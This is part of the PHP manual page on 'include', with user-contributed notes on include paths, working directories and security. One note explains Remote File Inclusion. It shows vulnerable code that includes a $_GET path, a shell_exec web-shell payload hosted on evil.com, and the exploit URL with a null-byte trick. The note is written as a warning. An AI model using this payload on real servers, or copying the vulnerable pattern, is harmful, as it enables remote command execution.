</p></blockquote>

 <p class="simpara">
  See also <span class="function"><a href="function.require.php" class="function">require</a></span>, <span class="function"><a href="function.require-once.php" class="function">require_once</a></span>,
  <span class="function"><a href="function.include-once.php" class="function">include_once</a></span>, <span class="function"><a href="function.get-included-files.php" class="function">get_included_files()</a></span>,
  <span class="function"><a href="function.readfile.php" class="function">readfile()</a></span>, <span class="function"><a href="function.virtual.php" class="function">virtual()</a></span>, and
  <a href="ini.core.php#ini.include-path" class="link">include_path</a>.
 </p>
</div>    <div class="contribute">
      <h3 class="title">Found A Problem?</h3>
      <div>
         
      </div>
      <div class="edit-bug">
        <a href="https://github.com/php/doc-base/blob/master/README.md" title="This will take you to our contribution guidelines on GitHub" target="_blank" rel="noopener noreferrer">Learn How To Improve This Page</a>
        •
        <a href="https://github.com/php/doc-en/blob/master/language/control-structures/include.xml">Submit a Pull Request</a>
        •
        <a href="https://github.com/php/doc-en/issues/new?body=From%20manual%20page:%20https:%2F%2Fphp.net%2Ffunction.include%0A%0A---">Report a Bug</a>
      </div>
    </div><section id="usernotes">
 <div class="head">
  <span class="action"><a href="/manual/add-note.php?sect=function.include&amp;repo=en&amp;redirect=https://www.php.net/manual/en/function.include.php">＋<small>add a note</small></a></span>
  <h3 class="title">User Contributed Notes <span class="count">13 notes</span></h3>
 </div><div id="allnotes">
  <div class="note" id="86842">  <div class="votes">
    <div id="Vu86842">
    <a href="/manual/vote-note.php?id=86842&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd86842">
    <a href="/manual/vote-note.php?id=86842&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V86842" title="60% like this...">
    151
    </div>
  </div>
  <a href="#86842" class="name">
  <strong class="user"><em>snowyurik at gmail dot com</em></strong></a><a class="genanchor" href="#86842"> &para;</a><div class="date" title="2008-11-05 10:49"><strong>16 years ago</strong></div>
  <div class="text" id="Hcom86842">
<div class="phpcode"><code><span class="html">This might be useful:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">].</span><span class="string">"/lib/sample.lib.php"</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span>So you can move script anywhere in web-project tree without changes.</span></code></div>
  </div>
 </div>
  <div class="note" id="116522">  <div class="votes">
    <div id="Vu116522">
    <a href="/manual/vote-note.php?id=116522&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd116522">
    <a href="/manual/vote-note.php?id=116522&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V116522" title="61% like this...">
    59
    </div>
  </div>
  <a href="#116522" class="name">
  <strong class="user"><em>Rash</em></strong></a><a class="genanchor" href="#116522"> &para;</a><div class="date" title="2015-01-17 05:55"><strong>10 years ago</strong></div>
  <div class="text" id="Hcom116522">
<div class="phpcode"><code><span class="html">If you want to have include files, but do not want them to be accessible directly from the client side, please, please, for the love of keyboard, do not do this:<br /><br /><span class="default">&lt;?php<br /><br /></span><span class="comment"># index.php<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'what'</span><span class="keyword">, </span><span class="string">'ever'</span><span class="keyword">);<br />include </span><span class="string">'includeFile.php'</span><span class="keyword">;<br /><br /></span><span class="comment"># includeFile.php<br /><br />// check if what is defined and die if not<br /><br /></span><span class="default">?&gt;<br /></span><br />The reason you should not do this is because there is a better option available. Move the includeFile(s) out of the document root of your project. So if the document root of your project is at "/usr/share/nginx/html", keep the include files in "/usr/share/nginx/src".<br /><br /><span class="default">&lt;?php<br /><br /></span><span class="comment"># index.php (in document root (/usr/share/nginx/html))<br /><br /></span><span class="keyword">include </span><span class="default">__DIR__ </span><span class="keyword">. </span><span class="string">'/../src/includeFile.php'</span><span class="keyword">;<br /><br /></span><span class="default">?&gt;<br /></span><br />Since user can't type 'your.site/../src/includeFile.php', your includeFile(s) would not be accessible to the user directly.</span></code></div>
  </div>
 </div>
  <div class="note" id="120069">  <div class="votes">
    <div id="Vu120069">
    <a href="/manual/vote-note.php?id=120069&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd120069">
    <a href="/manual/vote-note.php?id=120069&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V120069" title="61% like this...">
    37
    </div>
  </div>
  <a href="#120069" class="name">
  <strong class="user"><em>John Carty</em></strong></a><a class="genanchor" href="#120069"> &para;</a><div class="date" title="2016-10-20 08:29"><strong>8 years ago</strong></div>
  <div class="text" id="Hcom120069">
<div class="phpcode"><code><span class="html">Before using php's include, require, include_once or require_once statements, you should learn more about Local File Inclusion (also known as LFI) and Remote File Inclusion (also known as RFI).<br /><br />As example #3 points out, it is possible to include a php file from a remote server.<br /><br />The LFI and RFI vulnerabilities occur when you use an input variable in the include statement without proper input validation.  Suppose you have an example.php with code:<br /><br /><span class="default">&lt;?php<br /></span><span class="comment">// Bad Code<br /></span><span class="default">$path </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'path'</span><span class="keyword">];<br />include </span><span class="default">$path </span><span class="keyword">. </span><span class="string">'example-config-file.php'</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span><br />As a programmer, you might expect the user to browse to the path that you specify.<br /><br />However, it opens up an RFI vulnerability.  To exploit it as an attacker, I would first setup an evil text file with php code on my evil.com domain.<br /><br />evil.txt<br /><span class="default">&lt;?php </span><span class="keyword">echo </span><span class="default">shell_exec</span><span class="keyword">(</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'command'</span><span class="keyword">]);</span><span class="default">?&gt;<br /></span><br />It is a text file so it would not be processed on my server but on the target/victim server.  I would browse to:<br />h t t p : / / w w w .example.com/example.php?command=whoami&amp; path= h t t p : / / w w w .evil.com/evil.txt%00<br /><br />The example.php would download my evil.txt and process the operating system command that I passed in as the command variable.  In this case, it is whoami.  I ended the path variable with a %00, which is the null character.  The original include statement in the example.php would ignore the rest of the line.  It should tell me who the web server is running as.<br /><br />Please use proper input validation if you use variables in an include statement.</span></code></div>
  </div>
 </div>
  <div class="note" id="107685">  <div class="votes">
    <div id="Vu107685">
    <a href="/manual/vote-note.php?id=107685&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd107685">
    <a href="/manual/vote-note.php?id=107685&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V107685" title="59% like this...">
    39
    </div>
  </div>
  <a href="#107685" class="name">
  <strong class="user"><em>Anon</em></strong></a><a class="genanchor" href="#107685"> &para;</a><div class="date" title="2012-02-26 06:31"><strong>13 years ago</strong></div>
  <div class="text" id="Hcom107685">
<div class="phpcode"><code><span class="html">I cannot emphasize enough knowing the active working directory. Find it by: echo getcwd();<br />Remember that if file A includes file B, and B includes file C; the include path in B should take into account that A, not B, is the active working directory.</span></code></div>
  </div>
 </div>
  <div class="note" id="122667">  <div class="votes">
    <div id="Vu122667">
    <a href="/manual/vote-note.php?id=122667&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd122667">
    <a href="/manual/vote-note.php?id=122667&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V122667" title="60% like this...">
    9
    </div>
  </div>
  <a href="#122667" class="name">
  <strong class="user"><em>jbezorg at gmail dot com</em></strong></a><a class="genanchor" href="#122667"> &para;</a><div class="date" title="2018-04-26 02:34"><strong>7 years ago</strong></div>
  <div class="text" id="Hcom122667">
<div class="phpcode"><code><span class="html">Ideally includes should be kept outside of the web root. That's not often possible though especially when distributing packaged applications where you don't know the server environment your application will be running in. In those cases I use the following as the first line.<br /><br />( __FILE__ != $_SERVER['SCRIPT_FILENAME'] ) or exit ( 'No' );</span></code></div>
  </div>
 </div>
  <div class="note" id="86527">  <div class="votes">
    <div id="Vu86527">
    <a href="/manual/vote-note.php?id=86527&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd86527">
    <a href="/manual/vote-note.php?id=86527&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V86527" title="58% like this...">
    14
    </div>
  </div>
  <a href="#86527" class="name">
  <strong class="user"><em>Wade.</em></strong></a><a class="genanchor" href="#86527"> &para;</a><div class="date" title="2008-10-22 08:20"><strong>16 years ago</strong></div>
  <div class="text" id="Hcom86527">
<div class="phpcode"><code><span class="html">If you're doing a lot of dynamic/computed includes (&gt;100, say), then you may well want to know this performance comparison: if the target file doesn't exist, then an @include() is *ten* *times* *slower* than prefixing it with a file_exists() check. (This will be important if the file will only occasionally exist - e.g. a dev environment has it, but a prod one doesn't.)<br /><br />Wade.</span></code></div>
  </div>
 </div>
  <div class="note" id="118083">  <div class="votes">
    <div id="Vu118083">
    <a href="/manual/vote-note.php?id=118083&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd118083">
    <a href="/manual/vote-note.php?id=118083&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V118083" title="56% like this...">
    14
    </div>
  </div>
  <a href="#118083" class="name">
  <strong class="user"><em>error17191 at gmail dot com</em></strong></a><a class="genanchor" href="#118083"> &para;</a><div class="date" title="2015-10-01 09:39"><strong>9 years ago</strong></div>
  <div class="text" id="Hcom118083">
<div class="phpcode"><code><span class="html">When including a file using its name directly without specifying we are talking about the current working directory, i.e. saying (include "file") instead of ( include "./file") . PHP will search first in the current working directory (given by getcwd() ) , then next searches for it in the directory of the script being executed (given by __dir__).<br />This is an example to demonstrate the situation :<br />We have two directory structure :<br />-dir1<br />----script.php<br />----test<br />----dir1_test<br />-dir2<br />----test<br />----dir2_test<br /><br />dir1/test contains the following text :<br />This is test in dir1<br />dir2/test contains the following text:<br />This is test in dir2<br />dir1_test contains the following text:<br />This is dir1_test<br />dir2_test contains the following text:<br />This is dir2_test<br /><br />script.php contains the following code:<br /><span class="default">&lt;?php<br /><br /></span><span class="keyword">echo </span><span class="string">'Directory of the current calling script: ' </span><span class="keyword">. </span><span class="default">__DIR__</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Current working directory: ' </span><span class="keyword">. </span><span class="default">getcwd</span><span class="keyword">();<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Changing current working directory to dir2'</span><span class="keyword">;<br /></span><span class="default">chdir</span><span class="keyword">(</span><span class="string">'../dir2'</span><span class="keyword">);<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Directory of the current calling script: ' </span><span class="keyword">. </span><span class="default">__DIR__</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Current working directory: ' </span><span class="keyword">. </span><span class="default">getcwd</span><span class="keyword">();<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "dir2_test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'dir2_test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "dir1_test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'dir1_test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "./dir1_test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />(@include </span><span class="string">'./dir1_test'</span><span class="keyword">) or die(</span><span class="string">'couldn\'t include this file '</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>The output of executing script.php is :<br /><br />Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1<br />Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir1<br />including "test" ...<br />This is test in dir1<br />Changing current working directory to dir2<br />Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1<br />Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir2<br />including "test" ...<br />This is test in dir2<br />including "dir2_test" ...<br />This is dir2_test<br />including "dir1_test" ...<br />This is dir1_test<br />including "./dir1_test" ...<br />couldn't include this file</span></code></div>
  </div>
 </div>
  <div class="note" id="83066">  <div class="votes">
    <div id="Vu83066">
    <a href="/manual/vote-note.php?id=83066&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd83066">
    <a href="/manual/vote-note.php?id=83066&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V83066" title="53% like this...">
    12
    </div>
  </div>
  <a href="#83066" class="name">
  <strong class="user"><em>Rick Garcia</em></strong></a><a class="genanchor" href="#83066"> &para;</a><div class="date" title="2008-05-08 09:38"><strong>17 years ago</strong></div>
  <div class="text" id="Hcom83066">
<div class="phpcode"><code><span class="html">As a rule of thumb, never include files using relative paths. To do this efficiently, you can define constants as follows:<br /><br />----<br /><span class="default">&lt;?php </span><span class="comment">// prepend.php - autoprepended at the top of your tree<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'MAINDIR'</span><span class="keyword">,</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">) . </span><span class="string">'/'</span><span class="keyword">);<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'DL_DIR'</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">'downloads/'</span><span class="keyword">);<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'LIB_DIR'</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">'lib/'</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>----<br /><br />and so on. This way, the files in your framework will only have to issue statements such as this:<br /><br /><span class="default">&lt;?php<br /></span><span class="keyword">require_once(</span><span class="default">LIB_DIR </span><span class="keyword">. </span><span class="string">'excel_functions.php'</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span><br />This also frees you from having to check the include path each time you do an include.<br /><br />If you're running scripts from below your main web directory, put a prepend.php file in each subdirectory:<br /><br />--<br /><span class="default">&lt;?php<br /></span><span class="keyword">include(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">)) . </span><span class="string">'/prepend.php'</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>--<br /><br />This way, the prepend.php at the top always gets executed and you'll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.</span></code></div>
  </div>
 </div>
  <div class="note" id="120925">  <div class="votes">
    <div id="Vu120925">
    <a href="/manual/vote-note.php?id=120925&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd120925">
    <a href="/manual/vote-note.php?id=120925&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V120925" title="53% like this...">
    4
    </div>
  </div>
  <a href="#120925" class="name">
  <strong class="user"><em>ayon at hyurl dot com</em></strong></a><a class="genanchor" href="#120925"> &para;</a><div class="date" title="2017-04-03 06:24"><strong>8 years ago</strong></div>
  <div class="text" id="Hcom120925">
<div class="phpcode"><code><span class="html">It is also able to include or open a file from a zip file:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="string">"something.zip#script.php"</span><span class="keyword">;<br />echo </span><span class="default">file_get_contents</span><span class="keyword">(</span><span class="string">"something.zip#script.php"</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>Note that instead of using / or \, open a file from a zip file uses # to separate zip name and inner file's name.</span></code></div>
  </div>
 </div>
  <div class="note" id="127845">  <div class="votes">
    <div id="Vu127845">
    <a href="/manual/vote-note.php?id=127845&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd127845">
    <a href="/manual/vote-note.php?id=127845&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V127845" title="52% like this...">
    1
    </div>
  </div>
  <a href="#127845" class="name">
  <strong class="user"><em>anonphpuser</em></strong></a><a class="genanchor" href="#127845"> &para;</a><div class="date" title="2022-10-23 11:07"><strong>2 years ago</strong></div>
  <div class="text" id="Hcom127845">
<div class="phpcode"><code><span class="html">In the Example #2 Including within functions, the last two comments should be reversed I believe.</span></code></div>
  </div>
 </div>
  <div class="note" id="115827">  <div class="votes">
    <div id="Vu115827">
    <a href="/manual/vote-note.php?id=115827&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd115827">
    <a href="/manual/vote-note.php?id=115827&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V115827" title="52% like this...">
    4
    </div>
  </div>
  <a href="#115827" class="name">
  <strong class="user"><em>Ray.Paseur often uses Gmail</em></strong></a><a class="genanchor" href="#115827"> &para;</a><div class="date" title="2014-09-30 11:05"><strong>10 years ago</strong></div>
  <div class="text" id="Hcom115827">
<div class="phpcode"><code><span class="html">It's worth noting that PHP provides an OS-context aware constant called DIRECTORY_SEPARATOR.  If you use that instead of slashes in your directory paths your scripts will be correct whether you use *NIX or (shudder) Windows.  (In a semi-related way, there is a smart end-of-line character, PHP_EOL)<br /><br />Example:<br /><span class="default">&lt;?php <br />$cfg_path<br /></span><span class="keyword">= </span><span class="string">'includes'<br /></span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR<br /></span><span class="keyword">. </span><span class="string">'config.php'<br /></span><span class="keyword">;<br />require_once(</span><span class="default">$cfg_path</span><span class="keyword">);</span></span></code></div>
  </div>
 </div>
  <div class="note" id="94586">  <div class="votes">
    <div id="Vu94586">
    <a href="/manual/vote-note.php?id=94586&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd94586">
    <a href="/manual/vote-note.php?id=94586&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V94586" title="53% like this...">
    4
    </div>
  </div>
  <a href="#94586" class="name">
  <strong class="user"><em>Chris Bell</em></strong></a><a class="genanchor" href="#94586"> &para;</a><div class="date" title="2009-11-12 05:12"><strong>15 years ago</strong></div>
  <div class="text" id="Hcom94586">
<div class="phpcode"><code><span class="html">A word of warning about lazy HTTP includes - they can break your server.<br /><br />If you are including a file from your own site, do not use a URL however easy or tempting that may be. If all of your PHP processes are tied up with the pages making the request, there are no processes available to serve the include. The original requests will sit there tying up all your resources and eventually time out.<br /><br />Use file references wherever possible. This caused us a considerable amount of grief (Zend/IIS) before I tracked the problem down.</span></code></div>
  </div>
 </div>
  <div class="note" id="94392">  <div class="votes">
    <div id="Vu94392">
    <a href="/manual/vote-note.php?id=94392&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd94392">
    <a href="/manual/vote-note.php?id=94392&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V94392" title="52% like this...">
    5
    </div>
  </div>
  <a href="#94392" class="name">
  <strong class="user"><em>hyponiq at gmail dot com</em></strong></a><a class="genanchor" href="#94392"> &para;</a><div class="date" title="2009-11-02 02:12"><strong>15 years ago</strong></div>
  <div class="text" id="Hcom94392">
<div class="phpcode"><code><span class="html">I would like to point out the difference in behavior in IIS/Windows and Apache/Unix (not sure about any others, but I would think that any server under Windows will be have the same as IIS/Windows and any server under Unix will behave the same as Apache/Unix) when it comes to path specified for included files.<br /><br />Consider the following:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="string">'/Path/To/File.php'</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span><br />In IIS/Windows, the file is looked for at the root of the virtual host (we'll say C:\Server\Sites\MySite) since the path began with a forward slash.  This behavior works in HTML under all platforms because browsers interpret the / as the root of the server.<br /><br />However, Unix file/folder structuring is a little different.  The / represents the root of the hard drive or current hard drive partition.  In other words, it would basically be looking for root:/Path/To/File.php instead of serverRoot:/Path/To/File.php (which we'll say is /usr/var/www/htdocs).  Thusly, an error/warning would be thrown because the path doesn't exist in the root path.<br /><br />I just thought I'd mention that.  It will definitely save some trouble for those users who work under Windows and transport their applications to an Unix-based server.<br /><br />A work around would be something like:<br /><span class="default">&lt;?php<br />$documentRoot </span><span class="keyword">= </span><span class="default">null</span><span class="keyword">;<br /><br />if (isset(</span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">])) {<br />    </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">];<br />    <br />    if (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'/'</span><span class="keyword">) || </span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'\\'</span><span class="keyword">)) {<br />        if (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'/'</span><span class="keyword">)) {<br />            </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'/'</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />        }<br />        elseif (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'\\'</span><span class="keyword">)) {<br />            </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'\\'</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />        }<br />    }<br />    <br />    if (</span><span class="default">preg_match</span><span class="keyword">(</span><span class="string">'/[^\\/]{1}\\[^\\/]{1}/'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">)) {<br />        </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'/([^\\/]{1})\\([^\\/]{1})/'</span><span class="keyword">, </span><span class="string">'\\1DIR_SEP\\2'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />        </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'DIR_SEP'</span><span class="keyword">, </span><span class="string">'\\\\'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />    }<br />}<br />else {<br />    </span><span class="comment">/**<br />     * I usually store this file in the Includes folder at the root of my<br />     * virtual host. This can be changed to wherever you store this file.<br />     * <br />     * Example:<br />     * If you store this file in the Application/Settings/DocRoot folder at the<br />     * base of your site, you would change this array to include each of those<br />     * folders.<br />     * <br />     * &lt;code&gt;<br />     * $directories = array(<br />     *     'Application',<br />     *     'Settings',<br />     *     'DocRoot'<br />     * );<br />     * &lt;/code&gt;<br />     */<br />    </span><span class="default">$directories </span><span class="keyword">= array(<br />        </span><span class="string">'Includes'<br />    </span><span class="keyword">);<br />    <br />    if (</span><span class="default">defined</span><span class="keyword">(</span><span class="string">'__DIR__'</span><span class="keyword">)) {<br />        </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">__DIR__</span><span class="keyword">;<br />    }<br />    else {<br />        </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">);<br />    }<br />    <br />    </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">rtrim</span><span class="keyword">(</span><span class="default">$currentDirectory</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">);<br />    </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">$currentDirectory </span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">;<br />    <br />    foreach (</span><span class="default">$directories </span><span class="keyword">as </span><span class="default">$directory</span><span class="keyword">) {<br />        </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(<br />            </span><span class="default">DIRECTORY_SEPARATOR </span><span class="keyword">. </span><span class="default">$directory </span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">,<br />            </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">,<br />            </span><span class="default">$currentDirectory<br />        </span><span class="keyword">);<br />    }<br />    <br />    </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">rtrim</span><span class="keyword">(</span><span class="default">$currentDirectory</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">);<br />}<br /><br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'SERVER_DOC_ROOT'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span><br />Using this file, you can include files using the defined SERVER_DOC_ROOT constant and each file included that way will be included from the correct location and no errors/warnings will be thrown.<br /><br />Example:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="default">SERVER_DOC_ROOT </span><span class="keyword">. </span><span class="string">'/Path/To/File.php'</span><span class="keyword">;<br /></span><span class="default">?&gt;</span></span></code></div>
  </div>
 </div></div>
<div class="foot"><a href="/manual/add-note.php?sect=function.include&amp;repo=en&amp;redirect=https://www.php.net/manual/en/function.include.php">＋<small>add a note</small></a></div>
</section>    </section><!-- layout-content -->
        <aside class='layout-menu'>

        <ul class='parent-menu-list'>
                                    <li>
                <a href="language.control-structures.php">Control Structures</a>

                                    <ul class='child-menu-list'>

                                                <li class="">
                            <a href="control-structures.intro.php" title="Introduction">Introduction</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.if.php" title="if">if</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.else.php" title="else">else</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.elseif.php" title="elseif/else if">elseif/else if</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.alternative-syntax.php" title="Alternative syntax for control structures">Alternative syntax for control structures</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.while.php" title="while">while</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.do.while.php" title="do-&#8203;while">do-&#8203;while</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.for.php" title="for">for</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.foreach.php" title="foreach">foreach</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.break.php" title="break">break</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.continue.php" title="continue">continue</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.switch.php" title="switch">switch</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.match.php" title="match">match</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.declare.php" title="declare">declare</a>
                        </li>
                                                <li class="">
                            <a href="function.return.php" title="return">return</a>
                        </li>
                                                <li class="">
                            <a href="function.require.php" title="require">require</a>
                        </li>
                                                <li class="current">
                            <a href="function.include.php" title="include">include</a>
                        </li>
                                                <li class="">
                            <a href="function.require-once.php" title="require_&#8203;once">require_&#8203;once</a>
                        </li>
                                                <li class="">
                            <a href="function.include-once.php" title="include_&#8203;once">include_&#8203;once</a>
                        </li>
                                                <li class="">
                            <a href="control-structures.goto.php" title="goto">goto</a>
                        </li>
                        
                    </ul>
                
            </li>
                        
                    </ul>
    </aside>


  </div><!-- layout -->

  <footer>
    <div class="container footer-content">
      <div class="row-fluid">
      <ul class="footmenu">
        <li><a href="/manual/en/copyright.php">Copyright &copy; 2001-2025 The PHP Documentation Group</a></li>
        <li><a href="/my.php">My PHP.net</a></li>
        <li><a href="/contact.php">Contact</a></li>
        <li><a href="/sites.php">Other PHP.net sites</a></li>
        <li><a href="/privacy.php">Privacy policy</a></li>
      </ul>
      </div>
    </div>
  </footer>

    
<script src="/manual/en/js/ext/jquery-3.6.0.min.js"></script>
<script src="/manual/en/js/ext/FuzzySearch.min.js"></script>
<script src="/manual/en/js/ext/mousetrap.min.js"></script>
<script src="/manual/en/js/ext/jquery.scrollTo.min.js"></script>
<script src="/manual/en/js/search.js"></script>
<script src="/manual/en/js/common.js"></script>
